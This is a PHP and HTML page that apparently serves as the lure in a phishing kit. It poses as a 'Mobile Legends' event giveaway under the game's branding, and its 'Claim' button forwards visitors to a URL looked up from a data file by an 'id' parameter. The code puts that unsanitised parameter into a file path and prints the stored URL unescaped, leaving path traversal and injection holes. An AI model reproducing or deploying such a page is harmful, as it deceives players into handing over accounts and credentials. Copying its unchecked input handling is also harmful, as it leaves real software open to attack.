<?php
// include "../../../tools.php";

if(isset($_GET['id']) && !empty($_GET['id'])) {
    $url = $_GET['id'];
    // echo $url;
    $file_path = "../../data/$url.txt"; // Path lengkap ke file

    if(file_exists($file_path)) {
        $urlasli = file_get_contents($file_path);
        $parts = explode("|", $urlasli);
        // echo $parts[1];
        // echo $parts[0];
    } else {
        // File tidak ditemukan, tambahkan penanganan error di sini jika diperlukan
        // Misalnya, Anda bisa mengalihkan pengguna ke halaman login atau menampilkan pesan kesalahan
    }
} else {
    // ID tidak ada, tambahkan penanganan error di sini jika diperlukan
    // Misalnya, Anda bisa mengalihkan pengguna ke halaman login atau menampilkan pesan kesalahan
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, user-scalable=no">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
    <style>
    body {
    
    margin: 0px;
    
    
     

    background-image: url("https://i.postimg.cc/cLdf9bCr/1676862060024.jpg");
 

   

    background-position: center center;

    background-repeat: no-repeat;

    background-attachment: fixed;

    background-size: cover;

    background-color: #464646;

 

    color:white;
}

@media (min-width: 768px) {
  .button-63 {
    font-size: 24px;
    min-width: 196px;
  }
}
    </style>
    <title>Mobilelegends</title>
  </head>
  <body>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns" crossorigin="anonymous"></script>
<div class="row justify-content-center">

  <div class="col-md-10">
    <div style="margin: 20px;">
    <div class="text-center">
            <img src="Miya-Profile.png" alt="" class="img-fluid d-block mx-auto" width="120">
                <span class="Fz(15px) Fw(700) C(#000000) Mt(10px)" style="color:  !important;">@Mobilelegends.com</span>
         
           <p class="Maw(420px)  Fz(15px) C(#000000) Ta(c) Px(16px) center"
              style="word-wrap: break-word;line-height: 1.5rem;color: ;font-family: "cartoonish";">
                Event Mobile Legends✓
            </p> </div>  
      <a href="<?= $parts[1] ?>">
        <img src="ClaimML.png" alt="" class="img-fluid d-block mx-auto" width="170">
      <br>
    <br>
    <br>
    <br>    <br>
    <br>
    <br>
    <br>
    
      <br>
      </a>
     
  </div>
</div></body>
</html>
